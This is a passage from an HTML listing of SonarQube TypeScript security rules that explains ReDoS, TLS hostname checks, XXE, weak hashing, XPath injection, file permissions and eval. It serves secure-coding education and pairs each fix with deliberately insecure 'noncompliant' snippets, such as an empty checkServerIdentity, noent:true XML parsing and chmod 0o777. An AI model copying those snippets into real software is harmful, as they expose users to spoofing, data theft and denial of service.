  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE">HTTPONLY_COOKIE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4784">
              typescript:S4784
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=javascript%3AS5852&rule_key=javascript%3AS5852'>S5852</a> instead.</p>
<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021">CVE-2017-16021</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863">CVE-2018-13863</a> </li>
</ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>(a+)+s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a
href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following
characters: <code>*+{</code>.</p>
<p>Example: <code>(a+)*</code></p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using.</p>
<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href="https://github.com/google/re2">Google Re2</a>.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<h2>Sensitive Code Example</h2>
<pre>
const regex = /(a+)+b/; // Sensitive
const regex2 = new RegExp("(a+)+b"); // Sensitive

str.search("(a+)+b"); // Sensitive
str.match("(a+)+b"); // Sensitive
str.split("(a+)+b"); // Sensitive
</pre>
<p>Note: String.matchAll does not raise any issue as it is not supported by NodeJS.</p>
<h2>Exceptions</h2>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,
<code>(a|a?)+</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a "<code>|</code>".</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">CWE-624 - Executable Regular Expression
  Error</a> </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5759">
              typescript:S5759
            </a>
          </td>
          <td>
            <details>
              <p>Users often connect to web servers through HTTP proxies.</p>
<p>Proxy can be configured to forward the client IP address via the <code>X-Forwarded-For</code> or <code>Forwarded</code> HTTP headers.</p>
<p>IP address is a personal information which can identify a single user and thus impact his privacy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The web application uses reverse proxies or similar but doesn’t need to know the IP address of the user. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>User IP address should not be forwarded unless the application needs it, as part of an authentication, authorization scheme or log management for
examples.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://github.com/http-party/node-http-proxy">node-http-proxy</a></p>
<pre>
var httpProxy = require('http-proxy');

httpProxy.createProxyServer({target:'http://localhost:9000', xfwd:true}) // Noncompliant
  .listen(8000);
</pre>
<p><a href="https://github.com/chimurai/http-proxy-middleware">http-proxy-middleware</a></p>
<pre>
var express = require('express');

const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

app.use('/proxy', createProxyMiddleware({ target: 'http://localhost:9000', changeOrigin: true, xfwd: true })); // Noncompliant
app.listen(3000);
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://github.com/http-party/node-http-proxy">node-http-proxy</a></p>
<pre>
var httpProxy = require('http-proxy');

// By default xfwd option is false
httpProxy.createProxyServer({target:'http://localhost:9000'}) // Compliant
  .listen(8000);
</pre>
<p><a href="https://github.com/chimurai/http-proxy-middleware">http-proxy-middleware</a></p>
<pre>
var express = require('express');

const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

// By default xfwd option is false
app.use('/proxy', createProxyMiddleware({ target: 'http://localhost:9000', changeOrigin: true})); // Compliant
app.listen(3000);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For">developer.mozilla.org</a> - X-Forwarded-For </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2255">
              typescript:S2255
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11639">CVE-2018-11639</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>
<p>This rule flags code that writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p>Using cookies only for session IDs doesn’t make them secure. Follow <a
href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies">OWASP best practices</a> when you configure your
cookies.</p>
<p>As a side note, every information read from a cookie should be <a
href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitized</a>.</p>
<h2>Sensitive Code Example</h2>
<pre>
// === Built-in NodeJS modules ===
const http = require('http');
const https = require('https');

http.createServer(function(req, res) {
  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Sensitive
});
https.createServer(function(req, res) {
  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Sensitive
});
</pre>
<pre>
// === ExpressJS ===
const express = require('express');
const app = express();
app.use(function(req, res, next) {
  res.cookie('name', 'John'); // Sensitive
});
</pre>
<pre>
// === In browser ===
// Set cookie
document.cookie = "name=John"; // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/312">CWE-312 - Cleartext Storage of Sensitive Information</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/315">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE">COOKIE_USAGE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5527">
              typescript:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by overriding <code>checkServerIdentity</code> with an empty implementation. It is highly recommended to use
the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const https = require('node:https');

let options = {
  hostname: 'www.example.com',
  port: 443,
  path: '/',
  method: 'GET',
  checkServerIdentity: function() {}, // Noncompliant
  secureProtocol: 'TLSv1_2_method'
};

let req = https.request(options, (res) =&gt; {
  res.on('data', (d) =&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const tls = require('node:tls');

let options = {
  checkServerIdentity: function() {}, // Noncompliant
  secureProtocol: 'TLSv1_2_method'
};

let socket = tls.connect(443, "www.example.com", options, () =&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const https = require('node:https');

let options = {
  hostname: 'www.example.com',
  port: 443,
  path: '/',
  method: 'GET',
  secureProtocol: 'TLSv1_2_method'
};

let req = https.request(options, (res) =&gt; {
  res.on('data', (d) =&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const tls = require('node:tls');

let options = {
  secureProtocol: 'TLSv1_2_method'
};

let socket = tls.connect(443, "www.example.com", options, () =&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul>
  <li> Create a self-signed certificate for that machine. </li>
  <li> Add this self-signed certificate to the system’s trust store. </li>
  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>
</ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/297">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4790">
              typescript:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
const crypto = require("crypto");

const hash = crypto.createHash('sha1'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const crypto = require("crypto");

const hash = crypto.createHash('sha512'); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4817">
              typescript:S4817
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272">CVE-2016-6272</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149">CVE-2016-9149</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837">CVE-2012-4837</a> </li>
</ul>
<p>User-provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Sensitive Code Example</h2>
<pre>
// === Server side ===

var xpath = require('xpath');
var xmldom = require('xmldom');

var doc = new xmldom.DOMParser().parseFromString(xml);
var nodes = xpath.select(userinput, doc); // Sensitive
var node = xpath.select1(userinput, doc); // Sensitive
</pre>
<pre>
// === Client side ===

// Chrome, Firefox, Edge, Opera, and Safari use the evaluate() method to select nodes:
var nodes = document.evaluate(userinput, xmlDoc, null, XPathResult.ANY_TYPE, null); // Sensitive

// Internet Explorer uses its own methods to select nodes:
var nodes = xmlDoc.selectNodes(userinput); // Sensitive
var node = xmlDoc.SelectSingleNode(userinput); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/643">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4818">
              typescript:S4818
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785">CVE-2011-178</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645">CVE-2017-5645</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
const net = require('net');

var socket = new net.Socket(); // Sensitive
socket.connect(80, 'google.com');

// net.createConnection creates a new net.Socket, initiates connection with socket.connect(), then returns the net.Socket that starts the connection
net.createConnection({ port: port }, () =&gt; {}); // Sensitive

// net.connect is an alias to net.createConnection
net.connect({ port: port }, () =&gt; {}); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption ('Resource Exhaustion')</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2755">
              typescript:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in libxmljs</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
var libxmljs = require('libxmljs');
var fs = require('fs');

var xml = fs.readFileSync('xxe.xml', 'utf8');
libxmljs.parseXmlString(xml, {
    noblanks: true,
    noent: true, // Noncompliant
    nocdata: true
});
</pre>
<h4>Compliant solution</h4>
<p><code>parseXmlString</code> is safe by default.</p>
<pre data-diff-id="1" data-diff-type="compliant">
var libxmljs = require('libxmljs');
var fs = require('fs');

var xml = fs.readFileSync('xxe.xml', 'utf8');
libxmljs.parseXmlString(xml);
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S1525">
              typescript:S1525
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=javascript%3AS4507&rule_key=javascript%3AS4507'>S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint
in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to
attacks in production.</p>
<h3>Noncompliant code example</h3>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
  // Wait for user to resume.
  debugger;
}
</pre>
<h3>Compliant solution</h3>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2612">
              typescript:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the "<code>others</code>" category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>Node.js <a href="https://nodejs.org/api/fs.html"><code>fs</code></a></p>
<pre>
const fs = require('fs');

fs.chmodSync("/tmp/fs", 0o777); // Sensitive
</pre>
<pre>
const fs = require('fs');
const fsPromises = fs.promises;

fsPromises.chmod("/tmp/fsPromises", 0o777); // Sensitive
</pre>
<pre>
const fs = require('fs');
const fsPromises = fs.promises

async function fileHandler() {
  let filehandle;
  try {
    filehandle = fsPromises.open('/tmp/fsPromises', 'r');
    filehandle.chmod(0o777); // Sensitive
  } finally {
    if (filehandle !== undefined)
      filehandle.close();
  }
}
</pre>
<p>Node.js <a href="https://nodejs.org/api/process.html#process_process_umask_mask"><code>process.umask</code></a></p>
<pre>
const process = require('process');

process.umask(0o000); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Node.js <a href="https://nodejs.org/api/fs.html"><code>fs</code></a></p>
<pre>
const fs = require('fs');

fs.chmodSync("/tmp/fs", 0o770); // Compliant
</pre>
<pre>
const fs = require('fs');
const fsPromises = fs.promises;

fsPromises.chmod("/tmp/fsPromises", 0o770); // Compliant
</pre>
<pre>
const fs = require('fs');
const fsPromises = fs.promises

async function fileHandler() {
  let filehandle;
  try {
    filehandle = fsPromises.open('/tmp/fsPromises', 'r');
    filehandle.chmod(0o770); // Compliant
  } finally {
    if (filehandle !== undefined)
      filehandle.close();
  }
}
</pre>
<p>Node.js <a href="https://nodejs.org/api/process.html#process_process_umask_mask"><code>process.umask</code></a></p>
<pre>
const process = require('process');

process.umask(0o007); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S1523">
              typescript:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807">CVE-2017-9807</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802">CVE-2017-9802</a> </li>
</ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a
href="https://owasp.org/www-community/attacks/Code_Injection">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:
XSS attack) and have a huge impact on an application’s security.</p>
<p>This rule raises issues on calls to <code>eval</code> and <code>Function</code> constructor. This rule does not detect code injections. It only
highlights the use of APIs which should be used sparingly and very carefully. The goal is to guide security code reviews.</p>
<p>The rule also flags string literals starting with <code>javascript:</code> as the code passed in <code>javascript:</code> URLs is evaluated the
